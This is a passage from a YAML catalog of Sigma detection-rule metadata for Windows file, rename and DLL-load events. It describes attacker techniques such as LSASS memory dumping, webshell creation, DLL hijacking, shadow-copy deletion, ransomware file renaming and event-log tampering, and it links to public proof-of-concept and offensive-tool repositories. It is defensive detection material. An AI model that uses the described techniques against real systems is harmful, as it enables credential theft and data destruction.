  description: 'Detects the creation of a file with the name "code_tunnel.json" which
    indicate execution and usage of VsCode tunneling utility by an "Image" or "Process"
    other than VsCode.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39f1f9f2-9636-45de-98f6-a4046aa8e4b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_webshell_creation_detect.yml
  name: Potential Webshell Creation On Static Website
  description: Detects the creation of files with certain extensions on a static web
    site. This can be indicative of potential uploads of a web shell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  time_window: ''
  references:
  - PT ESC rule and personal experience
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/c95a0a1a2855dc0cd7f7327614545fe30482a636/Upload%20Insecure%20Files/README.md
  false_positives:
  - Legitimate administrator or developer creating legitimate executable files in
    a web application folder
  notes: ''
- detection_id: 28a452f3-786c-4fd8-b8f2-bddbe9d616d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_werfault_dll_hijacking.yml
  name: Creation of WerFault.exe/Wer.dll in Unusual Folder
  description: Detects the creation of a file named "WerFault.exe" or "wer.dll" in
    an uncommon folder, which could be a sign of WerFault DLL hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/hackers-are-now-hiding-malware-in-windows-event-logs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74a2b37d-fea4-41e0-9ac7-c9fbcf1f60cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_winrar_file_creation_in_startup_folder.yml
  name: WinRAR Creating Files in Startup Locations
  description: 'Detects WinRAR creating files in Windows startup locations, which
    may indicate an attempt to establish persistence by adding malicious files to
    the Startup folder.

    This kind of behaviour has been associated with exploitation of WinRAR path traversal
    vulnerability CVE-2025-6218 or CVE-2025-8088.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/mulwareX/CVE-2025-6218-POC
  - https://x.com/0x534c/status/1944694507787710685
  - https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d353dac0-1b41-46c2-820c-d7d2561fc6ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
  name: AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl - File
  description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via
    winrm.vbs and copied cscript.exe (can be renamed)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1216
  tags:
  - attack.defense-evasion
  - attack.t1216
  time_window: ''
  references:
  - https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 33f41cdd-35ac-4ba8-814b-c6a4244a1ad4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_wmi_persistence_script_event_consumer_write.yml
  name: WMI Persistence - Script Event Consumer File Write
  description: Detects file writes of WMI script event consumer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.privilege-escalation
  - attack.t1546.003
  - attack.persistence
  time_window: ''
  references:
  - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/
  false_positives:
  - Dell Power Manager (C:\Program Files\Dell\PowerManager\DpmPowerPlanSetup.exe)
  notes: ''
- detection_id: 8d5aca11-22b3-4f22-b7ba-90e60533e1fb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_wmiexec_default_filename.yml
  name: Wmiexec Default Output File
  description: Detects the creation of the default output filename used by the wmiexec
    tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.t1047
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/
  - https://github.com/fortra/impacket/blob/f4b848fa27654ca95bc0f4c73dbba8b9c2c9f30a/examples/wmiexec.py
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 614a7e17-5643-4d89-b6fe-f9df1a79641c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_wmiprvse_wbemcomn_dll_hijack.yml
  name: Wmiprvse Wbemcomn DLL Hijack - File
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI
    DLL Hijack scenario.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteWMIWbemcomnDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: e94b9ddc-eec5-4bb8-8a58-b9dc5f4e185f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_wpbbin_persistence.yml
  name: UEFI Persistence Via Wpbbin - FileCreation
  description: Detects creation of a file named "wpbbin" in the "%systemroot%\system32\"
    directory. Which could be indicative of UEFI based persistence method
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1542.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1542.001
  time_window: ''
  references:
  - https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c
  - https://persistence-info.github.io/Data/wpbbin.html
  false_positives:
  - Legitimate usage of the file by hardware manufacturer such as lenovo (Thanks @0gtweet
    for the tip)
  notes: ''
- detection_id: 4aafb0fa-bff5-4b9d-b99e-8093e659c65f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_writing_local_admin_share.yml
  name: Writing Local Admin Share
  description: 'Aversaries may use to interact with a remote network share using Server
    Message Block (SMB).

    This technique is used by post-exploitation frameworks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.lateral-movement
  - attack.t1546.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.002/T1021.002.md#atomic-test-4---execute-command-writing-output-to-local-admin-share
  false_positives:
  - Unknown
  notes: ''
- detection_id: ab90dab8-c7da-4010-9193-563528cfa347
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_executable_detected/file_executable_detected_win_susp_embeded_sed_file.yml
  name: Potentially Suspicious Self Extraction Directive File Created
  description: 'Detects the creation of a binary file with the ".sed" extension. The
    ".sed" extension stand for Self Extraction Directive files.

    These files are used by the "iexpress.exe" utility in order to create self extracting
    packages.

    Attackers were seen abusing this utility and creating PE files with embedded ".sed"
    entries.

    Usually ".sed" files are simple ini files and not PE binaries.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_executable_detected
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://strontic.github.io/xcyclopedia/library/iexpress.exe-D594B2A33EFAFD0EABF09E3FDC05FCEA.html
  - https://en.wikipedia.org/wiki/IExpress
  - https://www.virustotal.com/gui/file/602f4ae507fa8de57ada079adff25a6c2a899bd25cd092d0af7e62cdb619c93c/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: e3f673b3-65d1-4d80-9146-466f8b63fa99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_rename/file_rename_win_ransomware.yml
  name: Suspicious Appended Extension
  description: Detects file renames where the target filename uses an uncommon double
    extension. Could indicate potential ransomware activity renaming files and adding
    a custom extension to the encrypted files, such as ".jpg.crypted", ".docx.locky",
    etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_rename
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://app.any.run/tasks/d66ead5a-faf4-4437-93aa-65785afaf9e5/
  - https://blog.cyble.com/2022/08/10/onyx-ransomware-renames-its-leak-site-to-vsop/
  false_positives:
  - Backup software
  notes: ''
- detection_id: fb4e2211-6d08-426b-8e6f-0d4a161e3b1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_clfs_load.yml
  name: Clfs.SYS Loaded By Process Located In a Potential Suspicious Location
  description: Detects Clfs.sys being loaded by a process running from a potentially
    suspicious location. Clfs.sys is loaded as part of many CVEs exploits that targets
    Common Log File.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://ssd-disclosure.com/ssd-advisory-common-log-file-system-clfs-driver-pe/
  - https://x.com/Threatlabz/status/1879956781360976155
  false_positives:
  - Unknown
  notes: ''
- detection_id: 75e508f7-932d-4ebc-af77-269237a84ce1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_cmstp_load_dll_from_susp_location.yml
  name: DLL Loaded From Suspicious Location Via Cmspt.EXE
  description: Detects cmstp loading "dll" or "ocx" files from suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1218.003
  tags:
  - attack.defense-evasion
  - attack.t1218.003
  time_window: ''
  references:
  - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/TTPs/Defense%20Evasion/T1218%20-%20Signed%20Binary%20Proxy%20Execution/T1218.003%20-%20CMSTP/Procedures.yaml
  false_positives:
  - Unikely
  notes: ''
- detection_id: 6ec86d9e-912e-4726-91a2-209359b999b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_amsi_suspicious_process.yml
  name: Amsi.DLL Loaded Via LOLBIN Process
  description: Detects loading of "Amsi.dll" by a living of the land process. This
    could be an indication of a "PowerShell without PowerShell" attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  - https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 50f852e6-af22-4c78-9ede-42ef36aa3453
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_azure_microsoft_account_token_provider_dll_load.yml
  name: Potential Azure Browser SSO Abuse
  description: 'Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh
    tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined
    to Azure AD and a user logs in with their Azure AD account) wanting to perform
    SSO authentication in the browser.

    An attacker can use this to authenticate to Azure AD in a browser as that user.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - multi_signal_correlation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  time_window: ''
  references:
  - https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30
  false_positives:
  - False positives are expected since this rules is only looking for the DLL load
    event. This rule is better used in correlation with related activity
  notes: ''
- detection_id: 8cde342c-ba48-4b74-b615-172c330f2e93
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_comsvcs_load_renamed_version_by_rundll32.yml
  name: Suspicious Renamed Comsvcs DLL Loaded By Rundll32
  description: Detects rundll32 loading a renamed comsvcs.dll to dump process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1003.001
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1555200155351228419
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9ae01559-cf7e-4f8e-8e14-4c290a1b4784
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_credui_uncommon_process_load.yml
  name: CredUI.DLL Loaded By Uncommon Process
  description: Detects loading of "credui.dll" and related DLLs by an uncommon process.
    Attackers might leverage this DLL for potential use of "CredUIPromptForCredentials"
    or "CredUnPackAuthenticationBufferW".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056.002
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1056.002
  time_window: ''
  references:
  - https://securitydatasets.com/notebooks/atomic/windows/credential_access/SDWIN-201020013208.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.002/T1056.002.md#atomic-test-2---powershell---prompt-user-for-password
  - https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa
  - https://github.com/S12cybersecurity/RDPCredentialStealer
  false_positives:
  - Other legitimate processes loading those DLLs in your environment.
  notes: ''
- detection_id: bdc64095-d59a-42a2-8588-71fd9c9d9abc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_dbghelp_dbgcore_unsigned_load.yml
  name: Suspicious Unsigned Dbghelp/Dbgcore DLL Loaded
  description: 'Detects the load of dbghelp/dbgcore DLL (used to make memory dumps)
    by suspicious processes.

    Tools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API
    found in dbghelp.dll or dbgcore.dll.

    As an example, SilentTrynity C2 Framework has a module that leverages this API
    to dump the contents of Lsass.exe and transfer it over the network back to the
    attacker''s machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
  - https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html
  - https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84b0a8f3-680b-4096-a45b-e9a89221727c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_pcre_dotnet_dll_load.yml
  name: PCRE.NET Package Image Load
  description: Detects processes loading modules related to PCRE.NET package
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://twitter.com/rbmaslen/status/1321859647091970051
  - https://twitter.com/tifkin_/status/1321916444557365248
  false_positives:
  - Unknown
  notes: ''
- detection_id: b48492dc-c5ef-4572-8dff-32bc241c15c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_rstrtmgr_suspicious_load.yml
  name: Load Of RstrtMgr.DLL By A Suspicious Process
  description: 'Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious
    process.

    This library has been used during ransomware campaigns to kill processes that
    would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware).
    It has also recently been seen used by the BiBi wiper for Windows.

    It could also be used for anti-analysis purposes by shut downing specific processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  - T1562.001
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1486
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/windows-restart-manager-part-1/
  - https://www.crowdstrike.com/blog/windows-restart-manager-part-2/
  - https://web.archive.org/web/20231221193106/https://www.swascan.com/cactus-ransomware-malware-analysis/
  - https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html
  false_positives:
  - Processes related to software installation
  notes: ''
- detection_id: 3669afd2-9891-4534-a626-e5cf03810a61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_rstrtmgr_uncommon_load.yml
  name: Load Of RstrtMgr.DLL By An Uncommon Process
  description: 'Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon
    process.

    This library has been used during ransomware campaigns to kill processes that
    would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware).
    It has also recently been seen used by the BiBi wiper for Windows.

    It could also be used for anti-analysis purposes by shut downing specific processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  - T1562.001
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1486
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/windows-restart-manager-part-1/
  - https://www.crowdstrike.com/blog/windows-restart-manager-part-2/
  - https://web.archive.org/web/20231221193106/https://www.swascan.com/cactus-ransomware-malware-analysis/
  - https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html
  false_positives:
  - Other legitimate Windows processes not currently listed
  - Processes related to software installation
  notes: ''
- detection_id: ec8c4047-fad9-416a-8c81-0f479353d7f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_sdiageng_load_by_msdt.yml
  name: Diagnostic Library Sdiageng.DLL Loaded By Msdt.EXE
  description: Detects both of CVE-2022-30190 (Follina) and DogWalk vulnerabilities
    exploiting msdt.exe binary to load the "sdiageng.dll" library
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  - cve.2022-30190
  time_window: ''
  references:
  - https://www.securonix.com/blog/detecting-microsoft-msdt-dogwalk/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 092bc4b9-3d1d-43b4-a6b4-8c8acd83522f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_system_management_automation_susp_load.yml
  name: PowerShell Core DLL Loaded By Non PowerShell Process
  description: 'Detects loading of essential DLLs used by PowerShell by non-PowerShell
    process.

    Detects behavior similar to meterpreter''s "load powershell" extension.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.t1059.001
  - attack.execution
  time_window: ''
  references:
  - https://adsecurity.org/?p=2921
  - https://github.com/p3nt4/PowerShdll
  false_positives:
  - Used by some .NET binaries, minimal on user workstation.
  - Used by Microsoft SQL Server Management Studio
  notes: ''
- detection_id: e76c8240-d68f-4773-8880-5c6f63595aaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_tttracer_module_load.yml
  name: Time Travel Debugging Utility Usage - Image
  description: Detects usage of Time Travel Debugging Utility. Adversaries can execute
    malicious processes and dump processes, such as lsass.exe, via tttracer.exe.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1218
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1218
  - attack.t1003.001
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Tttracer/
  - https://twitter.com/mattifestation/status/1196390321783025666
  - https://twitter.com/oulusoyum/status/1191329746069655553
  false_positives:
  - Legitimate usage by software developers/testers
  notes: ''
- detection_id: e5f5c693-52d7-4de5-88ae-afbfbce85595
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_unsigned_node_load.yml
  name: Unsigned .node File Loaded
  description: 'Detects the loading of unsigned .node files.

    Adversaries may abuse a lack of .node integrity checking to execute arbitrary
    code inside of trusted applications such as Slack.

    .node files are native add-ons for Electron-based applications, which are commonly
    used for desktop applications like Slack, Discord, and Visual Studio Code.

    This technique has been observed in the DripLoader malware, which uses unsigned
    .node files to load malicious native code into Electron applications.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1036.005
  - T1129
  - T1574.001
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1129
  - attack.t1574.001
  - attack.t1036.005
  time_window: ''
  references:
  - https://www.coreycburton.com/blog/driploader-case-study
  - https://github.com/CoreyCBurton/DripLoaderNG
  - https://www.electronjs.org/docs/latest/tutorial/native-code-and-electron
  false_positives:
  - VsCode extensions or similar legitimate tools might use unsigned .node files.
    These should be investigated on a case-by-case basis, and whitelisted if determined
    to be benign.
  notes: ''
- detection_id: 333cdbe8-27bb-4246-bf82-b41a0dca4b70
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_vss_ps_susp_load.yml
  name: Suspicious Volume Shadow Copy VSS_PS.dll Load
  description: 'Detects the image load of vss_ps.dll by uncommon executables. This
    DLL is used by the Volume Shadow Copy Service (VSS) to manage shadow copies of
    files and volumes.

    It is often abused by attackers to delete or manipulate shadow copies, which can
    hinder forensic investigations and data recovery efforts.

    The fact that it is loaded by processes that are not typically associated with
    VSS operations can indicate suspicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/ba88ca45589fae0139a40ca27738a8fc2dfbe1be5a64a9558f4e0f52b35c5add
  - https://twitter.com/am0nsec/status/1412232114980982787
  false_positives:
  - Unknown
  notes: ''
- detection_id: 37774c23-25a1-4adb-bb6d-8bb9fd59c0f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_vssapi_susp_load.yml
  name: Suspicious Volume Shadow Copy Vssapi.dll Load
  description: Detects the image load of VSS DLL by uncommon executables
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/ORCx41/DeleteShadowCopies
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48bfd177-7cf2-412b-ad77-baf923489e82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_dll_vsstrace_susp_load.yml
  name: Potentially Suspicious Volume Shadow Copy Vsstrace.dll Load
  description: Detects the image load of VSS DLL by uncommon executables
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/ORCx41/DeleteShadowCopies
  false_positives:
  - Unknown
  notes: ''
- detection_id: 49329257-089d-46e6-af37-4afce4290685
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/image_load/image_load_hktl_sharpevtmute.yml
  name: HackTool - SharpEvtMute DLL Load
  description: Detects the load of EvtMuteHook.dll, a key component of SharpEvtHook,
    a tool that tampers with the Windows event logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://github.com/bats3c/EvtMute
  false_positives:
  - Other DLLs with the same Imphash
  notes: ''
